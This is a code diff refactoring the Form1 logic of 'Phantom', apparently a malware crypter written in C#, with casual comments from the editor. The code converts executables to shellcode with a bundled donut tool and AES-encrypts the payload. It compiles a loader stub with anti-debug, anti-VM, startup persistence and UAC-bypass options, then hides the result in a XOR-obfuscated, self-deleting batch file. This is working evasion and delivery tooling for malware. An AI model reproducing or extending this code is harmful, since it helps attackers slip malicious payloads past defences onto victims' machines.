@@ -25,14 +25,14 @@ namespace Phantom
             InitializeComponent();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private void Form1_Load(object sender, EventArgs e) // I actually fucking hate how hes checking the update thing so i commented the whole thing out its at the bottom
         {
             SettingsObject obj = Settings.Load();
             if (obj != null)
             {
                 UnpackSettings(obj);
             }
-            Task.Factory.StartNew(CheckVersion);
+            //Task.Factory.StartNew(CheckVersion);
             UpdateKeys();
         }
 
@@ -136,309 +136,163 @@ namespace Phantom
             return result;
         }
 
-        // Method to create a crypted batch file from a executable
+        // Method to create a crypted batch file from an executable
         private void Crypt()
         {
-            // Disable button to prevent multiple executions
             buildButton.Enabled = false;
-
-            // Switch to the output tab
-            tabControl1.SelectedTab = tabControl1.TabPages[@"outputPage"];
-
-            // Clear items from listBox2
+            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
             listBox2.Items.Clear();
 
-            // Call UpdateKeys method with null arguments to update and refresh the AES keys
-            // UPDATE: Idk why ts guy had parameters on ts (CHATGPT DETECTED 🚨)
+            #region Initialization
             var keys = UpdateKeys();
             var stubKeys = UpdateKeys();
-
-            // Initialize a random number generator
             Random rng = new Random();
+            string inputPath = textBox1.Text;
 
-            // Retrieve input from textBox1
-            string _input = textBox1.Text;
-
-            // Decode keys and initialization vectors from base64 strings
-            byte[] _key = keys.key, _iv = keys.iv, _stubkey = stubKeys.key, _stubiv = stubKeys.iv;
-
-            // Specify encryption mode
+            byte[] key = keys.key, iv = keys.iv, stubKey = stubKeys.key, stubIv = stubKeys.iv;
             EncryptionMode mode = EncryptionMode.AES;
 
-            // Check if input file doesn't exist or is not an executable
-            if (!File.Exists(_input) || Path.GetExtension(_input) != @".exe")
+            if (!File.Exists(inputPath) || Path.GetExtension(inputPath) != ".exe")
             {
-                // Show error message
-                MessageBox.Show(!File.Exists(_input) ? @"Invalid input path." : @"Invalid input file.", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                // Re-enable build button
+                MessageBox.Show(!File.Exists(inputPath) ? "Invalid input path." : "Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 buildButton.Enabled = true;
-
-                // Exit function
                 return;
             }
+            #endregion
 
-            // Read bytes from input file
-            byte[] pbytes = File.ReadAllBytes(_input);
+            #region Payload Processing
+            byte[] payloadBytes = File.ReadAllBytes(inputPath);
+            bool isNetAssembly = false;
 
-            bool isnetasm = false;
-
-            // Check the file type of the input file
-            FileType fileType = GetFileType(_input);
+            FileType fileType = GetFileType(inputPath);
             if (fileType == FileType.Invalid)
             {
-                // Show error message
-                MessageBox.Show(@"Invalid input file.", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                // Exit function
+                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                buildButton.Enabled = true;
                 return;
             }
             else if (fileType == FileType.NET64 || fileType == FileType.NET86)
             {
-                isnetasm = true;
+                isNetAssembly = true;
             }
 
-            // If input file is not a .NET assembly, convert it to shellcode and update the payload byte array
-            if (!isnetasm)
+            if (!isNetAssembly)
             {
-                listBox2.Items.Add(@"[Native Payload Detected] - Converting payload to shellcode...");
-                int archType = 0;
-                if (fileType == FileType.x64)
+                listBox2.Items.Add("[Native Payload Detected] - Converting payload to shellcode...");
+                int archType = fileType == FileType.x64 ? 2 : 1;
+
+                string payloadExtension = Path.GetExtension(inputPath);
+                string nativePayloadPath = $"payload_native{payloadExtension}";
+                File.WriteAllBytes(nativePayloadPath, payloadBytes);
+                File.WriteAllBytes("donut.exe", ExtractResource("Phantom.Resources.donut.exe"));
+
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
                 {
-                    archType = 2;
-                }
-                else
-                {
-                    archType = 1;
-                }
-                string payloadExtension = Path.GetExtension(_input);
-                File.WriteAllBytes($"payload_native{payloadExtension}", pbytes);
-                File.WriteAllBytes(@"donut.exe", ExtractResource(@"Phantom.Resources.donut.exe"));
-                ProcessStartInfo processStartInfo = new ProcessStartInfo() { 
                     UseShellExecute = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = "cmd.exe",
-                    Arguments = $"/C donut.exe -a {archType} -o \"payload_native.bin\" -i \"payload_native{payloadExtension}\" -b 1 -k 2 -x 3 & exit"
+                    Arguments = $"/C donut.exe -a {archType} -o \"payload_native.bin\" -i \"{nativePayloadPath}\" -b 1 -k 2 -x 3 & exit"
                 };
 
                 Process.Start(processStartInfo).WaitForExit();
 
-                File.Delete(@"donut.exe");
-                File.Delete($"payload_native{payloadExtension}");
+                File.Delete("donut.exe");
+                File.Delete(nativePayloadPath);
 
-                pbytes = File.ReadAllBytes(@"payload_native.bin");
-
-                File.Delete(@"payload_native.bin");
+                payloadBytes = File.ReadAllBytes("payload_native.bin");
+                File.Delete("payload_native.bin");
             }
+            #endregion
 
-            // Add message to listBox2
-            listBox2.Items.Add(@"Encrypting payload...");
+            #region Encryption and Stub Creation
+            listBox2.Items.Add("Encrypting payload...");
+            byte[] encryptedPayload = Encrypt(mode, Compress(payloadBytes), stubKey, stubIv);
 
-            // Encrypt and compress payload
-            byte[] payload_enc = Encrypt(mode, Compress(pbytes), _stubkey, _stubiv);
+            listBox2.Items.Add("Creating stub...");
+            string stub = StubGen.CreateCS(stubKey, stubIv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isNetAssembly, rng);
 
-            // Add message to listBox2
-            listBox2.Items.Add(@"Creating stub...");
+            listBox2.Items.Add("Building stub...");
+            string tempFile = Path.GetTempFileName(); // Use a proper temporary file
+            File.WriteAllBytes("payload.exe", encryptedPayload);
 
-            // Generate C# stub code
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isnetasm, rng);
-
-            // Add message to listBox2
-            listBox2.Items.Add(@"Building stub...");
-
-            // Create temporary file
-            string tempfile = CreateTempFile(rng);
-
-            // Write payload to file
-            File.WriteAllBytes(@"payload.exe", payload_enc);
-
-            // Initialize C# code provider
-            CSharpCodeProvider csc = new CSharpCodeProvider();
-
-            // Specify compiler parameters (Stager Stub)
-            CompilerParameters parameters = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"System.Windows.Forms.dll" }, tempfile)
+            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll", "System.Windows.Forms.dll" }, tempFile)
             {
                 GenerateExecutable = true,
-                CompilerOptions = @"-optimize -unsafe",
+                CompilerOptions = "-optimize -unsafe",
                 IncludeDebugInformation = false
             };
 
-            // Add embedded resources to compiler parameters
-            parameters.EmbeddedResources.Add(@"payload.exe");
+            parameters.EmbeddedResources.Add("payload.exe");
             if (uacBypass.Checked)
             {
-                if (fileType == FileType.NET64 || fileType == FileType.x64)
-                {
-                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC64.dll")));
-                }
-                else
-                {
-                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC.dll")));
-                }
-                parameters.EmbeddedResources.Add(@"UAC");
+                string uacResource = fileType == FileType.NET64 || fileType == FileType.x64 ? "Phantom.Resources.UAC64.dll" : "Phantom.Resources.UAC.dll";
+                File.WriteAllBytes("UAC", Compress(ExtractResource(uacResource)));
+                parameters.EmbeddedResources.Add("UAC");
             }
+
             foreach (string item in listBox1.Items)
             {
                 parameters.EmbeddedResources.Add(item);
             }
 
-            // Compile stub code
-            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
-
-            // Check for compilation errors
+            CompilerResults results = new CSharpCodeProvider().CompileAssemblyFromSource(parameters, stub);
             if (results.Errors.Count > 0)
             {
-                // Delete temporary files
-                File.Delete(@"payload.txt");
-                File.Delete(tempfile);
-                if (uacBypass.Checked)
-                {
-                    File.Delete(@"UAC");
-                }
-
-                // Show error message
-                MessageBox.Show(@"Stager Stub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                // Re-enable build button
+                CleanupFiles(new[] { "payload.exe", tempFile, "UAC" });
+                MessageBox.Show("Stager Stub build error!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 buildButton.Enabled = true;
-
-                // Exit function
                 return;
             }
 
-            // Read bytes from temporary file
-            byte[] stubbytes = File.ReadAllBytes(tempfile);
+            byte[] stubBytes = File.ReadAllBytes(tempFile);
+            CleanupFiles(new[] { "payload.exe", tempFile, "UAC" });
+            #endregion
 
-            // Delete temporary files
-            File.Delete(@"payload.exe");
-            File.Delete(tempfile);
-            if (uacBypass.Checked)
-            {
-                File.Delete(@"UAC");
-            }
+            #region Final Encryption and Batch File Creation
+            listBox2.Items.Add("Encrypting stub...");
+            byte[] encryptedStub = Encrypt(mode, Compress(stubBytes), key, iv);
 
-            // Create another temporary file
-            tempfile = CreateTempFile(rng);
+            listBox2.Items.Add("Creating batch file...");
+            string batchContent = FileGen.CreateBat(key, iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, rng);
+            List<string> contentLines = new List<string>(batchContent.Split(new[] { Environment.NewLine }, StringSplitOptions.None));
 
-            // Initialize another C# code provider
-            CSharpCodeProvider csc2 = new CSharpCodeProvider();
+            contentLines.Insert(rng.Next(0, contentLines.Count), $":: {Convert.ToBase64String(encryptedStub)}");
+            batchContent = string.Join(Environment.NewLine, contentLines);
+            batchContent = Obfuscator.GenerateXorBatchScript(batchContent, rng);
 
-            // Specify compiler parameters for second compilation (Bypass Stub)
-            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"Microsoft.VisualBasic.dll" }, tempfile)
-            {
-                GenerateExecutable = true,
-                CompilerOptions = @"-optimize -unsafe",
-                IncludeDebugInformation = false
-            };
-
-            // Compile embedded BStub.cs file
-            string BStub_Str = GetEmbeddedString(@"Phantom.Resources.BStub.cs");
-            if (fileType == FileType.NET64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            else if (fileType == FileType.x64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            CompilerResults results2 = csc2.CompileAssemblyFromSource(parameters2, BStub_Str);
-
-            // Check for compilation errors
-            if (results2.Errors.Count > 0)
-            {
-                // Delete temporary files
-                File.Delete(@"payload.txt");
-                File.Delete(tempfile);
-
-                // Show error message
-                MessageBox.Show(@"BStub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                // Re-enable build button
-                buildButton.Enabled = true;
-
-                // Exit function
-                return;
-            }
-
-            // Encrypt and compress stub bytes
-            byte[] bstubbytes = Encrypt(mode, Compress(File.ReadAllBytes(tempfile)), _key, _iv);
-
-            // Delete temporary files
-            File.Delete(@"payload.exe");
-            File.Delete(tempfile);
-
-            // Add message to listBox2
-            listBox2.Items.Add(@"Encrypting stub...");
-
-            // Encrypt and compress stub bytes
-            byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);
-
-            // Add message to listBox2
-            listBox2.Items.Add(@"Creating batch file...");
-
-            // Generate batch file content
-            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, rng);
-
-            // Split content into lines
-            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
-
-            // Insert encrypted stub bytes into content lines at random position
-            content_lines.Insert(rng.Next(0, content_lines.Count), $":: {Convert.ToBase64String(bstubbytes)}\\{Convert.ToBase64String(stub_enc)}");
-            content = string.Join(Environment.NewLine, content_lines);
-            content = Obfuscator.GenerateXorBatchScript(content, rng);
-            // Initialize SaveFileDialog
-            SaveFileDialog sfd = new SaveFileDialog()
+            SaveFileDialog sfd = new SaveFileDialog
             {
                 AddExtension = true,
-                DefaultExt = @"bat",
-                Title = @"Save File",
-                Filter = @"Batch files (*.bat)|*.bat",
+                DefaultExt = "bat",
+                Title = "Save File",
+                Filter = "Batch files (*.bat)|*.bat",
                 RestoreDirectory = true,
-                FileName = Path.ChangeExtension(_input, @"bat")
+                FileName = Path.ChangeExtension(inputPath, "bat")
             };
 
-            // If file dialog result is OK
             if (sfd.ShowDialog() == DialogResult.OK)
             {
-                // Add message to listBox2
-                listBox2.Items.Add(@"Writing output...");
-
-                // Write content to selected file
-                File.WriteAllText(sfd.FileName, content, Encoding.ASCII);
-
-                // Show success message
-                MessageBox.Show(@"Done!", @"Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                listBox2.Items.Add("Writing output...");
+                File.WriteAllText(sfd.FileName, batchContent, Encoding.ASCII);
+                MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
+            #endregion
 
-            // Re-enable build button
             buildButton.Enabled = true;
         }
 
-        private void CheckVersion()
+        #region Helper Methods
+        private void CleanupFiles(string[] files)
         {
-            try
+            foreach (string file in files)
             {
-                WebClient wc = new WebClient();
-                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/C5Hackr/Phantom/main/version").Trim();
-                wc.Dispose();
-                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
+                if (File.Exists(file))
                 {
-                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
-                    if (currentversion != latestversion)
-                    {
-                        DialogResult result = MessageBox.Show($"Phantom {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
-                        if (result == DialogResult.Yes)
-                        {
-                            Process.Start("https://github.com/C5Hackr/Phantom/releases/tag/" + latestversion);
-                        }
-                    }
+                    File.Delete(file);
                 }
-                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
-            }
-            catch
-            {
             }
         }
+        #endregion
 
         private (byte[] key, byte[] iv) UpdateKeys()
         {
@@ -452,7 +306,8 @@ namespace Phantom
 
         private void UnpackSettings(SettingsObject obj)
         {
-            listBox2.Items.Add(@"Unpacking settings..."); // At sign bro??? what are you doing lock in bro
+            listBox2.Items.Add("Unpacking settings...");
+
             textBox1.Text = obj.inputFile;
             antiDebug.Checked = obj.antiDebug;
             antiVM.Checked = obj.antiVM;
@@ -462,21 +317,27 @@ namespace Phantom
             startup.Checked = obj.startup;
             uacBypass.Checked = obj.uacBypass;
 
-            // UPDATE: Legit just didnt handle the try properly
-
-            try
+            if (obj.bindedFiles != null && obj.bindedFiles.Length > 0)
             {
-                listBox1.Items.AddRange(obj.bindedFiles);
+                try
+                {
+                    listBox1.Items.AddRange(obj.bindedFiles);
+                }
+                catch (Exception ex)
+                {
+                    listBox2.Items.Add($"Exception : {ex.Message}");
+                }
             }
-            catch (Exception ex)
+            else
             {
-                listBox2.Items.Add($"Exception caught: \n{ex.Message}");
+                listBox2.Items.Add("No binded files.");
             }
         }
 
+
         private SettingsObject PackSettings()
         {
-            SettingsObject obj = new SettingsObject()
+            return new SettingsObject
             {
                 inputFile = textBox1.Text,
                 antiDebug = antiDebug.Checked,
@@ -486,14 +347,8 @@ namespace Phantom
                 runas = runas.Checked,
                 startup = startup.Checked,
                 uacBypass = uacBypass.Checked,
+                bindedFiles = listBox1.Items.Cast<string>().ToArray()
             };
-            List<string> paths = new List<string>();
-            foreach (string item in listBox1.Items)
-            {
-                paths.Add(item);
-            }
-            obj.bindedFiles = paths.ToArray();
-            return obj;
         }
 
         private void startup_CheckedChanged(object sender, EventArgs e)
@@ -542,5 +397,34 @@ namespace Phantom
                 }
             }
         }
+
+        /*
+         * You dont understand how much this makes me mad 
+         * 
+        private void CheckVersion()
+        {
+            try
+            {
+                WebClient wc = new WebClient();
+                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/C5Hackr/Phantom/main/version").Trim();
+                wc.Dispose();
+                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
+                {
+                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
+                    if (currentversion != latestversion)
+                    {
+                        DialogResult result = MessageBox.Show($"Phantom {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
+                        if (result == DialogResult.Yes)
+                        {
+                            Process.Start("https://github.com/C5Hackr/Phantom/releases/tag/" + latestversion);
+                        }
+                    }
+                }
+                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
+            }
+            catch
+            {
+            }
+        }*/
     }
 }
